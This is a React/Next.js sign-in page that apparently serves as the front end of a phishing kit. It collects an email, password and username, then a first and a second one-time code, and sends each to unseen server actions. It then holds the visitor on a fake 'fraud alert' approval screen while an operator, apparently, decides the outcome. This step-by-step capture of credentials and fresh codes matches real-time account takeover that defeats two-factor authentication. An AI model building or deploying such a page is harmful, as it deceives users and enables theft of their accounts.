'use client';

import { useEffect, useState } from 'react';
import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions';

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success';

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.';

export default function SignInPage() {
  const [step, setStep] = useState<Step>('credentials');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [otp, setOtp] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [note, setNote] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return;
    let cancelled = false;
    const tick = async () => {
      const s = await getStatus(attemptId);
      if (cancelled) return;
      if (s.status === 'approved') setStep('approved_success');
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected');
        setError('Sign-in was rejected.');
      }
    };
    tick();
    const id = setInterval(tick, 2500);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [step, attemptId]);

  if (step === 'approved_success') {
    return (
      <main style={plainPage}>
        <div style={column}>
          <h1 style={heading}>Congratulations</h1>
          <p style={text}>Your account &amp; verification has been approved.</p>
          {email ? <p style={text}>{email}</p> : null}
        </div>
      </main>
    );
  }

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setAttemptId(r.attemptId);
        setStep('username');
        setNote(null);
        return;
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const r = await submitUsername({ attemptId, username });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        setStep('otp1');
        setNote('Code sent to your email.');
        return;
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const which = step === 'otp1' ? 1 : 2;
        const r = await submitOtp({ attemptId, otp, which });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        if (r.next === 'otp2') {
          setStep('otp2');
          setNote('New second code sent to your email.');
          return;
        }
        setStep('awaiting_approval');
        setNote(WAIT_MSG);
      }
    } catch (err) {
      setLoading(false);
      setError(err instanceof Error ? err.message : 'Error');
    }
  }

  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
    credentials: 'Log in',
    username: 'Enter username',
    otp1: 'Enter first code',
    otp2: 'Enter second code',
    awaiting_approval: 'Verification in progress',
    rejected: 'Sign-in blocked',
  };

  // FIXED: This is the corrected version - only check for the 4 active states
  const activeSteps: Step[] = ['credentials', 'username', 'otp1', 'otp2'];

  return (
    <main style={plainPage}>
      <div style={column}>
        <h1 style={heading}>{titles[step as Exclude<Step, 'approved_success'>]}</h1>

        <form onSubmit={onSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          {step === 'credentials' && (
            <>
              <label style={label}>
                Email
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  style={input}
                />
              </label>
              <label style={label}>
                Password
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={input}
                />
              </label>
            </>
          )}

          {step === 'username' && (
            <label style={label}>
              Username
              <input
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={input}
                autoComplete="username"
              />
            </label>
          )}

          {(step === 'otp1' || step === 'otp2') && (
            <label style={label}>
              {step === 'otp1' ? 'Code' : 'Second code'}
              <input
                required
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={(e) =>
                  setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
                }
                style={input}
              />
            </label>
          )}

          {step === 'awaiting_approval' && (
            <p style={{ ...text, lineHeight: 1.5 }}>{WAIT_MSG}</p>
          )}

          {error && <p style={{ color: '#c00', margin: 0, fontSize: 14 }}>{error}</p>}
          {note && step !== 'awaiting_approval' && (
            <p style={{ color: '#333', margin: 0, fontSize: 14 }}>{note}</p>
          )}

          {/* FIXED: Only show buttons for active steps (not awaiting_approval, rejected, or approved_success) */}
          {activeSteps.includes(step) && (
            <button type="submit" disabled={loading} style={button}>
              {loading ? 'Please wait…' : 'Continue'}
            </button>
          )}

          {step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && step !== 'approved_success' && (
            <button
              type="button"
              onClick={() => {
                setStep('credentials');
                setAttemptId(null);
                setUsername('');
                setOtp('');
                setError(null);
                setNote(null);
              }}
              style={buttonSecondary}
            >
              Start over
            </button>
          )}
        </form>
      </div>
    </main>
  );
}

const plainPage: React.CSSProperties = {
  minHeight: '100vh',
  margin: 0,
  background: '#ffffff',
  color: '#000000',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  padding: 16,
  fontFamily: 'system-ui, sans-serif',
};

const column: React.CSSProperties = {
  width: '100%',
  maxWidth: 320,
};

const heading: React.CSSProperties = {
  margin: '0 0 16px',
  fontSize: 20,
  fontWeight: 600,
};

const label: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: 4,
  fontSize: 14,
};

const input: React.CSSProperties = {
  height: 36,
  padding: '0 8px',
  border: '1px solid #ccc',
  borderRadius: 2,
  background: '#fff',
  color: '#000',
  fontSize: 14,
};

const button: React.CSSProperties = {
  height: 36,
  border: '1px solid #999',
  borderRadius: 2,
  background: '#f0f0f0',
  color: '#000',
  fontSize: 14,
  cursor: 'pointer',
};

const buttonSecondary: React.CSSProperties = {
  height: 36,
  border: '1px solid #ccc',
  borderRadius: 2,
  background: '#fff',
  color: '#000',
  fontSize: 14,
  cursor: 'pointer',
};

const text: React.CSSProperties = {
  margin: '0 0 8px',
  fontSize: 14,
  color: '#000',
};